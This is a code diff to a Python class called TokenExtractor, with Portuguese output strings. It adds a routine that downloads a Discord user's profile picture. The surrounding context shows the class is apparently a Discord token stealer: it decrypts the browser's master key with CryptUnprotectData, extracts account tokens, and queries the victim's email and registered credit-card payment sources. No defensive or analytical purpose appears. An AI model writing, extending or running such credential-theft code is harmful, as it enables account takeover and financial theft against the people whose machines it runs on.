@@ -59,6 +59,11 @@ class TokenExtractor:
             print(f"Nome de usuário: {user_data['username']}")
             print(f"E-mail: {user_data.get('email', 'Não disponível')}")
 
+            avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png"
+            print(f"Foto de perfil: {avatar_url}")
+            
+            self.download_profile_picture(user_data['id'], user_data['avatar'])
+
             payment_sources = self.get_payment_sources(token)
             if payment_sources:
                 print(f"Cartões de crédito registrados: {len(payment_sources)}")
@@ -120,6 +125,17 @@ class TokenExtractor:
         master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
         master_key = master_key[5:]
         return CryptUnprotectData(master_key, None, None, None, 0)[1]
+
+    def download_profile_picture(self, user_id, avatar_id):
+        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.png"
+        response = requests.get(avatar_url, stream=True)
+        if response.status_code == 200:
+            with open(f"{user_id}_avatar.png", "wb") as f:
+                for chunk in response.iter_content(1024):
+                    f.write(chunk)
+            print(f"Foto de perfil salva como {user_id}_avatar.png")
+        else:
+            print(f"Falha ao baixar a foto de perfil para o usuário {user_id}")
 
     def get_tokens(self):
         self.extract_tokens()
